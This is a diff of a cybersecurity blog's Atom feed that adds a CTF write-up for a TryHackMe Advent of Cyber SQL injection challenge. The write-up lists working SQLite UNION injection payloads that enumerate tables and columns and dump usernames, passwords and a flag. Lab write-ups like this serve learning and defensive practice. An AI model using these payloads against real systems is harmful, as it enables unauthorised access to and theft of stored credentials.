@@ -1,4 +1,87 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-29T10:09:43-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">Roll For Initiative 2</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2.html" rel="alternate" type="text/html" title="Roll For Initiative 2" /><published>2020-08-07T22:24:15-04:00</published><updated>2020-08-07T22:24:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2.html">&lt;p&gt;Programming - Roll for Initiative 2&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-07T00:41:09-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">Advent of Cyber 2 - Day 5 (Manual Mode)</title><link href="http://localhost:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5.html" rel="alternate" type="text/html" title="Advent of Cyber 2 - Day 5 (Manual Mode)" /><published>2020-12-05T23:12:21-05:00</published><updated>2020-12-05T23:12:21-05:00</updated><id>http://localhost:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5</id><content type="html" xml:base="http://localhost:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5.html">&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/THMlogo.png&quot; width=&quot;225&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;Someone stole Santa's gift list!&lt;/h2&gt;
+&lt;p&gt;Sqlmap was a nice and straightforward way of solving this challenge, but I was curious how it could be solved manually.  I saw that others were also interested in the AoC2 Discord channel, so I decided to take a crack at it and share a possible solution.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Just to take a look at what we have access to upfront, we can get all search button related output by trying a wildcard:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/d01b15ca70e045c397034252c2769587.png&quot; alt=&quot;37de0ab710e9d480cc41b2ed5193a753.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;As for an injection vector, one of the provided resources for this challenge includes a &lt;a href=&quot;https://github.com/payloadbox/sql-injection-payload-list&quot; target=&quot;_blank&quot;&gt;list of generic payloads&lt;/a&gt; that we can try out. Here’s one string that yields an error message:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/06fa999848894cbd964eeb2da8ec5041.png&quot; alt=&quot;fba82e82ee07183820e349147aa9c123.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It looks like this will work, we just need to make a small adjustment because we have 2 output columns:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Badboi' UNION SELECT 1, 2--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/29f06dd5da49482e9f67fd8114809547.png&quot; alt=&quot;031ad161871e6b41493e28d231633b90.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Now we need to leverage this vulnerability to find out what tables are in the database.  We had a hint in the challenge text:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Santa's TODO: Look at alternative database systems that are better than sqlite.&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Based on this, we can assume SQLite is the database that is running.  The search for some payloads that we can adapt is made easier thanks to &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md&quot; target=&quot;_blank&quot;&gt;another resource shared in the challenge description&lt;/a&gt;. Re-working the syntax of the &lt;em&gt;“Integer/String based - Extract table name”&lt;/em&gt; payload just a bit:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Badboi' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/dd2ff72ac7644a869b52e2842fd71317.png&quot; alt=&quot;3a432b4959a9aac3e635618b51163f41.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;And then doing the same with a payload for column discovery:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/46fd0eb327d442d6a303186db5e233ab.png&quot; alt=&quot;1c5324b827db2a2ea0f7ed1018c3526f.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After doing this for each table, we can output the contents of the details we want to see:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, username FROM users--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/080978b7226f40b6964ca21d86c4260d.png&quot; alt=&quot;0bdc0e71277868101f7c77e063bf562e.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, password FROM users--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/ba3b17ac13b546db8a400c979b7bd644.png&quot; alt=&quot;2a4d9996142daa35fd8ac35f9258056c.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In a more targeted fashion that might have been useful in other situations:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION ALL SELECT NULL, password FROM users WHERE username LIKE 'Admin' --&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/49a29d9f490f42e6bdad559338426d66.png&quot; alt=&quot;d9f814e92318bf197fa8e1369ee879d1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;or&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, kid FROM sequels WHERE title LIKE '%Try%' --&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/6319907a5e6346239668f91a4c1c26e3.png&quot; alt=&quot;2538f2ad6752664f59a38c8bf769565b.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;and in the case of the challenge we also specifically want:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, flag FROM hidden_table --&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/b9d2ecbcf5b643a3ac05bfc94c3a85dc.png&quot; alt=&quot;a7b2d6fdbc6a1a55e416899387936018.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It was worth taking the extra time to solve the challenge this way, and I definitely appreciate sqlmap for all it automates and how it formats things a lot more now.&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="TryHackMe" /><summary type="html"></summary></entry><entry><title type="html">Roll For Initiative 2</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2.html" rel="alternate" type="text/html" title="Roll For Initiative 2" /><published>2020-08-07T22:24:15-04:00</published><updated>2020-08-07T22:24:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2.html">&lt;p&gt;Programming - Roll for Initiative 2&lt;/p&gt;
 
 &lt;p&gt;Just like in Roll for Initiative 1: when connecting to the server, the “Backdoors and Breaches” game begins and we need to “Roll for Initiative”.&lt;/p&gt;
 
@@ -245,14 +328,4 @@
 
 &lt;p&gt;It looks like -o will let us output the traffic to a file and look a bit closer:&lt;/p&gt;
 
-&lt;p&gt;    &lt;img src=&quot;/assets/writeups/HacktivityCon2020/3fead7b2d4d3441ab560975879017df9.png&quot; alt=&quot;5848d661feaaffb223fbbae2e6ea42ef.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2020" /><summary type="html">Another neat little play on standard CTF challenges. While this obviously was a reference to Netcat, here is the output we get when we try to connect:</summary></entry><entry><title type="html">Spaghetti</title><link href="http://localhost:4000/writeups/2020/07/31/HacktivityCon-Spaghetti.html" rel="alternate" type="text/html" title="Spaghetti" /><published>2020-07-31T17:38:21-04:00</published><updated>2020-07-31T17:38:21-04:00</updated><id>http://localhost:4000/writeups/2020/07/31/HacktivityCon-Spaghetti</id><content type="html" xml:base="http://localhost:4000/writeups/2020/07/31/HacktivityCon-Spaghetti.html">&lt;p&gt;Well, it’s spaghetti.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/HacktivityCon2020/1e95ebcb2929418aa2365a5023cb906c.png&quot; alt=&quot;5540d5d9b43b37cb4045bfbc1e6b7f1a.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Let’s see what’s hidden underneath using binwalk!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/HacktivityCon2020/b8c3a25a64b7460c8611e6621ce64581.png&quot; alt=&quot;8dee89fe9d1a11f59dab996dc8a3b72a.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looks like a Zlib file!&lt;/p&gt;
-
-&lt;p&gt;    &lt;img src=&quot;/assets/writeups/HacktivityCon2020/bac43b3d67924166a9e81256dcd7f0f8.png&quot; alt=&quot;6e8794983bb5b6b634169afa66956b6f.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2020" /><summary type="html">Well, it’s spaghetti.</summary></entry></feed>
+&lt;p&gt;    &lt;img src=&quot;/assets/writeups/HacktivityCon2020/3fead7b2d4d3441ab560975879017df9.png&quot; alt=&quot;5848d661feaaffb223fbbae2e6ea42ef.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2020" /><summary type="html">Another neat little play on standard CTF challenges. While this obviously was a reference to Netcat, here is the output we get when we try to connect:</summary></entry></feed>
